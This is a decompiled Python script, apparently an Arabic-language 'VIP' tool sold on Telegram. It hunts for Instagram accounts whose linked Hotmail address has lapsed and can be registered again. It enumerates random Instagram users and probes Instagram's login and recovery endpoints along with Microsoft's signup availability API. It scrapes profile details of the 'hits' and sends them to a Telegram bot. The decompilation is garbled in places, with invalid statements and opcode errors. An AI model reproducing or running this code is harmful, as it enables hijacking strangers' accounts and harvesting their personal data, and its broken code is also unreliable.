
# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —


import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));


foo = False
if foo:
    bar = 1 / 0
import getpass
import sys
import base64
PASSWORD = '000000'
ENTER_PASSWORD_MSG = '[!] Please enter the password: '
WRONG_PASSWORD_MSG = '[!] The entered password is wrong!'

def check_password():
    user_input = getpass.getpass(ENTER_PASSWORD_MSG)
    if user_input != PASSWORD:
        print(WRONG_PASSWORD_MSG)
        sys.exit(1)
        return None

check_password()
print('HELLO BLACk CAT    to toools VIP ')
print('VIP MONEY ')
print('speed promax')
import datetime
an = datetime.datetime.now()
an2 = datetime.datetime(2024, 11, 10, 0, 0, 0, 0)
if an > an2 or an == an2:
    exit('انتهى وقت الاشتراك في الاداه')
from hashlib import md5
from time import time
import requests
from uuid import uuid4
import os
from random import choice, randrange
import sys
from threading import Thread
from user_agent import generate_user_agent
import datetime
import time

class Luffy:
    
    def __init__(self):
        self.hits = 0
        self.bad_email = 0
        self.bad_instgram = 0
        self.good_insgram = 0
        self.token = input('[+] TOKEN : ')
        if os.name == 'posix':
            pass
        'clear'('cls')
        self.id = input('[+]  ID : ')
        if os.name == 'posix':
            pass
        'clear'('cls')
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1' }
        response = requests.get('https://signup.live.com/signup', headers = headers)
        canary = str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode('unicode_escape').encode('ascii').decode('unicode_escape').encode('ascii').decode('ascii')
        self.amsc = response.cookies.get_dict()['amsc']
        cookies = {
            'amsc': self.amsc }
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'canary': canary,
            'content-type': 'application/json; charset=utf-8',
            'origin': 'https://signup.live.com',
            'referer': 'https://signup.live.com/',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1' }
        json_data = {
            'clientExperiments': [
                {
                    'parallax': 'enableplaintextforsignupexperiment',
                    'control': 'enableplaintextforsignupexperiment_control',
                    'treatments': [
                        'enableplaintextforsignupexperiment_treatment'] }] }
        response = requests.post('https://signup.live.com/API/EvaluateExperimentAssignments', cookies = cookies, headers = headers, json = json_data).json()
        self.canary = response['apiCanary']
        os.system
        if os.name == 'posix':
            pass
        'clear'('cls')
        print('errors get hotmail tokens')
        if os.name == 'posix':
            pass
        'clear'('cls')
        for _ in range(50):
            Thread(target = self.home).start()
            return None

    
    def insta1(self, email):
        csrftoken = md5(str(time.time()).encode()).hexdigest()
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
            'x-csrftoken': csrftoken }
        data = {
            'username': email }
        response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers = headers, data = data).text
        if 'showAccountRecoveryModal' in response:
            return True

    
    def insta2(self, email):
        url = 'https://b.i.instagram.com/api/v1/accounts/login/'
        headers = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            'Accept': '*/*',
            'Cookie': 'missing',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com' }
        uid = str(uuid4())
        data = {
            'uuid': uid,
            'password': 'ffffdddddaaa666',
            'username': email,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0' }
        re = requests.post(url, headers = headers, data = data).text
        if 'bad_password' in re:
            return True

    
    def check_hotmail(self, email):
        if '@' in email:
            email = email.split('@hotmail.com')[0]
        tim = str(time.time()).split('.')[0]
        headers = {
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
            'x-client-data': 'CLrdygE=',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["S336499450:1722131730722296"]',
            'x-same-domain': '1' }
        par = {
            'biz': 'false',
            'continue': 'https://mail.google.com/mail/mu/mp/580/?login=1',
            'ddm': '0',
            'dsh': f'''S-{tim}:1722139307145196''',
            'flowEntry': 'SignUp',
            'flowName': 'GlifWebSignIn' }
        re = requests.get(f'''https://accounts.google.com/lifecycle/flows/signup?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1&ddm=0&flowEntry=SignUp&flowName=GlifWebSignIn&dsh=S{tim}%3A1722152876221519''', params = par, cookies = None, headers = headers)
        tok = re.text.split('3DGlifWebSignIn%26TL%3D')[2].split("','")[0]
        '?0'
        params = {
            'rpcids': 'E815hb',
            'source-path': '/lifecycle/steps/signup/name',
            'f.sid': '6212541759014659703',
            'bl': 'boq_identity-account-creation-evolution-ui_20240724.08_p0',
            'hl': 'ar',
            'TL': tok,
            '_reqid': '136953',
            'rt': 'c' }
        data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22zaid%5C%22%2C%5C%22ali%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0e6K9lFzNAdC3rGk8SRcG6K%3A1722150498848&'
        rr = requests.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params = params, cookies = None, headers = headers, data = data)
        tok = rr.text.split('3DGlifWebSignIn%26TL%3D')[2].split("','")[0]
        'sec-ch-ua-wow64'
        params = {
            'rpcids': 'eOY7Bb',
            'source-path': '/lifecycle/steps/signup/birthdaygender',
            'f.sid': '6212541759014659703',
            'bl': 'boq_identity-account-creation-evolution-ui_20240724.08_p0',
            'hl': 'ar',
            'TL': tok,
            '_reqid': '836953',
            'rt': 'c' }
        data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B2000%2C10%2C20%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CkV1qXQUCAAYqurJyCrqNOonCTM4ZXkP0ADQBEArZ1NP5cu3RU1Ycj4okwH-FNrHtFcz5kZBn8EpMmEWW3FnHInLGR_XrRHOVc1WHeAUtzQAAAjydAAAAHKcBB7EAQ-hrZe31BIDxYMgrnGE6oK9_vcOJJvq-P7SWhmo-kXKqaeCHPu68jHw8N9EWZEJEnNZOwduBTXmjTumyvoVLvsGsZuFWBSE6NPqtSvD4-VxfdrQMRUQi-qM3K-OlKEmlndu-g1oWwK9-DZf-d4vlqH4yeQXXjzQ_uQRJ8_9cbD_i52-ytbwhIbQjJSwblNuegt5XR_Fj5ERwy2QjQTvIPq5IXWqCAthJtLosMFENKLf7BqSk-GjX_wN9t9Yi4E4Zd4q4zI_U-KJHSNxrmVMe-09ZvzDaIUdxMyFWqDumhCdnbWB3jk_DqW-2-JTlyYzdaBv9iHtxQzK1hEjrliwgM852uuzN3R2eDoXHQR1kt0VEIt18MLbYtiCEVZfQQDl0t3w8IdmRuav7C5YjWcZ_1B4LyIrLRl0ps23K2xNCh4Yx1of8pjLaXkiMM3KtqBql9uCOj5zAnteeSaYDYXGoyL2P4AGZz56cplzO5togjyEl2Kruhv14XPN-3QKQ5pVD90oigYfo9S3lwKjrw5hOb_W-5i_0iTSKnzBbqmpHyquSrBMXaW4I6WIHCg74T06hH0eHX8JDmJu9fqUV98FurLx7CsjmFt2BgaF9q_YW-afTpws4seT7OCF-ym7IgFipEWz4XD6YdnJrM0QR-lGv9zaJjs0Prh2MoTREL0Ynyeyq4NHhAKBlQDZVUWGi7hexjCvryddX50VRV1FcdIe67rew5EJOOjSkVGBnTV0a2xvkgilEddhzJ0Ie2y_p8sTfXU4sUBb3CLvIiHCd-RbxjzjXeZLWU0LpLuFXD5zkgjQpXYX-rymsoPTi0gkpKcoUsIb2YEpOpauX24SyFPXm1Mr-3yl5OL_BoBdsCoBspMq8Rdk051GJXiP03g2i3vP6y4nIUs4nHB-0hZ9VOurDEWt6xp2fJzmvAUkgEREAoX8gQi0Q-iKJVkk6Lf76gdTxh3YbPcMBXjwjYhzbZeK-OvaEllcwwR5K1Zqmu0jPJB5-HImC55mABllihUHOzL87y8wVu-EZxS8n2O9Z4WfSgczJTI3tzUq6JUt3chFYXyYjvr7WmJZjC8LOIwRZaMALEYmEoIngQPy8guZdRXW40vVgNudUiVdfmLegNmRCUfLRWtVXouIKP0mC_-L-IW_WM_tFDSuGh3EOvuS224JcZN5fIRi0aREJYEjItygdNLQb2kAK4K-oVaF6TlK5MZn4wNWE5xaNb3dyyM83gyn5JYLxHL95voWhIaoW5_qPMs1hTQdMObhpXYCmCzyarjgrMVx05kH9Vz211x4THnsOiyIdLT_g1JM-jy2bdytPUOhHO4Q6hSnDp4xAoJ1PE2-LSm-Ee1-_dcKqFXefWt94OmDacYp1KeoJg0ofTsye4k2dj7B6UsH1m9AakITEITc6WsCGMRJCYcfBT7MI4wSn00Xa5WdCPMvRwOTA7FTWQpkmo7xnHlU1WA1PQgZX0ff5RTzogLGd8CJXfFgW8CIAO_-ovqKKtuHuZj4-YTMuvtwffnm01PppryBr886oBFaB7BNL3htjNTzltnMxalSVLSjYvhCNcqxDVgSJuPfnju6imzufHKVUvtY2Qdj4PGtUjxtjq05GaVcJXXyQ3kCd7QlXonfevIxn0aYt1kvSWdcHEZ--LLSdAeCjQWk3l7voy7GswqP-w6X_vGqUFgTD3MoaAh5_coYdVDnW9LSW7tPnpSgYGKcqmhpuNdu9zr1YpH5OjpkABmR1zBFn-clyjWoaBv_9aQ9bUlYQeBlSQWHCx6IveyEJ2jAT423lfoOefQHXdEJo2ZlSnMdeZJJ34_VwAOQvL6kgC3FosGmJ5VIX63O4RsIReQ%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0e6K9lFzNAdC3rGk8SRcG6K%3A1722150498848&'
        rz = requests.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params = params, cookies = None, headers = headers, data = data)
        headers = {
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
            'x-client-data': 'CLrdygE=',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["S336499450:1722131730722296"]',
            'x-same-domain': '1' }
        data = f'''f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0eKMHZmgEC_FYSd7DksXn11%3A1722139309078&'''
        params = {
            'TL': tok }
        re = requests.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params = params, cookies = None, headers = headers, data = data).text
        if 'signup' in re:
            return True
        return '?0'
        if Exception:
            e = 'sec-ch-ua-wow64'
            e = None
            del e
            e = None
            del e

    
    def get_info(self, username, domen):
        headers = {
            'Connection': 'keep-alive',
            'Content-Length': '356' }
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + username + '"}',
            'ig_sig_key_version': '4' }
        response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers = headers, data = data)
        rest = response.json()['email']
        'Liger'
        rest = None
        headers = {
            'accept': '*/*',
            'accept-language': 'en',
            'referer': 'https://www.instagram.com/{}/'.format(username),
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-requested-with': 'XMLHttpRequest' }
        params = {
            'username': username }
        response = requests.get('https://www.instagram.com/api/v1/users/web_profile_info/', params = params, headers = headers).json()
        'X-FB-HTTP-Engine'
        response = None
        id = response['data']['user']['id']
        'i.instagram.com'
        id = None
        followerNum = response['data']['user']['edge_followed_by']['count']
        'Host'
        followerNum = None
        followingNum = response['data']['user']['edge_follow']['count']
        'gzip, deflate'
        followingNum = None
        postNum = response['data']['user']['edge_owner_to_timeline_media']['count']
        'Accept-Encoding'
        postNum = None
        isPraise = response['data']['user']['is_private']
        'application/x-www-form-urlencoded; charset=UTF-8'
        isPraise = None
        full_name = response['data']['user']['full_name']
        'Content-Type'
        full_name = None
        biography = response['data']['user']['biography']
        'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
        biography = None
        if id == None:
            date = None
        date = requests.get('https://mel7n.pythonanywhere.com/?id={}'.format(id)).json()['date']
        'Cookie'
        date = None
        'en-GB, en-US'
        date = None
        info = '\n\n ○𝐇𝐈 𝐏𝐑𝐎 𝐇𝐈𝐓 𝐈𝐍𝐒𝐓𝐀  \n●●●●●●●●●●●●●●●●●●●\n    𝐅𝐎𝐋𝐋𝐎𝐖𝐒: {}\n    𝐅𝐎𝐋𝐋𝐎𝐖𝐆: {}\n    𝐏𝐎𝐒𝐓𝐒: {}\n    NONE : {}\n    𝐔𝐒𝐄𝐑𝐍𝐀𝐌 :{}\n    𝐄𝐌𝐀𝐈𝐋 : {}@{}\n    𝐃𝐀𝐓𝐄 : {}\n    𝐈𝐃 : {}\n    𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {}\n    𝐏𝐈𝐎 : {}\n   𝐑𝐄𝐒𝐓 : {}\n●●●●●●●●●●●●●●●●●●●\n    𝐁𝐘»BLACK CAT BCM vip \n        '.format(followerNum, followingNum, postNum, isPraise, username, username, domen, date, id, full_name, biography, rest)
        print(info)
        f = open('hits.txt', 'a')
        f.write(info + '\n')
        None(None, None)
        if not 'Accept-Language':
            pass
        'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)'
        'User-Agent'
        '567067343352427'
        'X-IG-App-ID'
        info = '\n\n○𝐇𝐈 𝐏𝐑𝐎 𝐇𝐈𝐓 𝐈𝐍𝐒𝐓𝐀\n ●●●●●●●●●●●●●●●●●●●\n    𝐅𝐎𝐋𝐋𝐎𝐖𝐒: {}\n    𝐅𝐎𝐋𝐋𝐎𝐖𝐆: {}\n    𝐏𝐎𝐒𝐓𝐒: {}\n    NONE : {}\n    𝐔𝐒𝐄𝐑𝐍𝐀𝐌 :{}\n    𝐄𝐌𝐀𝐈𝐋 : {}@{}\n    𝐃𝐀𝐓𝐄 : {}\n    𝐈𝐃 : {}\n    𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {}\n    𝐏𝐈𝐎 : {}\n   𝐑𝐄𝐒𝐓 : {}\n ●●●●●●●●●●●●●●●●●●●\n      𝐁𝐘» BlAck cat VIP BCM\n         \n                '.format(None, None, None, None, username, username, domen, None, None, None, None, None)
        print(info)
        f = open('hits.txt', 'a')
        f.write(info + '\n')
        None(None, None)
        if not '3brTvw==':
            pass
        'X-IG-Capabilities'
        'WIFI'
        'X-IG-Connection-Type'
        requests.get('https://api.telegram.org/bot' + str(self.token) + '/sendMessage?chat_id=' + str(self.id) + f'''&text={info}''')
        return None
        '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0'

    
    def check_hotmail(self, email):
        cookies = {
            'amsc': self.amsc }
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'canary': self.canary,
            'content-type': 'application/json; charset=utf-8',
            'origin': 'https://signup.live.com',
            'referer': 'https://signup.live.com/',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1' }
        json_data = {
            'signInName': email }
        response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies = cookies, headers = headers, json = json_data).text
        if '"isAvailable":true' in response:
            return True
        return None
        if Exception:
            e = None
            e = None
            del e
            e = None
            del e

    
    def get_username(self):
        headers = {
            'x-bloks-version-id': '213c82555f99bb0cecb045c627a22f08209d7a699fc238c7e73a0482e70267f9',
            'x-csrftoken': 'QOeFYsOi8enKuW80uC0WezhvEgiydc2Y',
            'x-fb-friendly-name': 'PolarisProfilePageContentDirectQuery',
            'x-fb-lsd': '3TdmFoJ7r2hQowntSy6Exd',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3iNxyHufbREf9pIUL6m2ciMIIxA3vQTyCHW_yWjgu5dmsq' }
        data = {
            '__spin_b': 'trunk',
            '__spin_t': '1721129295',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisProfilePageContentDirectQuery',
            'variables': '{"id":"' + str(randrange(1, 402149008)) + '","render_surface":"PROFILE"}',
            'server_timestamps': 'true',
            'doc_id': '7663723823674585' }
        username = requests.post('https://www.instagram.com/graphql/query', cookies = { }, headers = headers, data = data).json()['data']['user']['username']
        return [
            username]
        if Exception:
            e = '1014910249'
            e = None
            del e
            e = None
            del e

    
    def home(self):
        sys.stdout.write(f'''\n\rHits : {self.hits}\nBad Instagram {self.bad_instgram}\nBad Email : {self.bad_email}\nGood Instgram : {self.good_insgram}\r''')
        usernames = self.get_username()
        if usernames == None:
            for username in usernames:
                sys.stdout.write(f'''\rHits : {self.hits}\n Bad Instagram {self.bad_instgram}\n Bad Email : {self.bad_email}\n Good Instgram : {self.good_insgram}\r''')
                api1 = choice('122')
                api2 = choice('122')
                email1 = username + '@hotmail.com'
                email2 = username + '@hotmail.com'
                if '1' == api1:
                    s11 = self.insta1(email1)
                if '2' == api1:
                    s11 = self.insta2(email1)
                if '1' == api2:
                    s22 = self.insta1(email2)
                if '2' == api2:
                    s22 = self.insta2(email2)
                if s11 == True:
                    (self.good_insgram += 1).good_insgram = None
                    qq = self.check_hotmail(email1)
                    if qq == True:
                        (self.hits += 1).hits = None
                        (username, domen) = email1.split('@')
                        self.get_info(username, domen)
                    (self.bad_email += 1).bad_email = None
                (self.bad_instgram += 1).bad_instgram = None
                if s22 == True:
                    (self.good_insgram += 1).good_insgram = None
                    qq = self.check_hotmail(email2)
                    if qq == True:
                        (self.hits += 1).hits = None
                        (username, domen) = email2.split('@')
                        self.get_info(username, domen)
                    (self.bad_email += 1).bad_email = None
                (self.bad_instgram += 1).bad_instgram = None
                if Exception:
                    e = None
                    e = None
                    del e
                    e = None
                    del e


Luffy()

Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
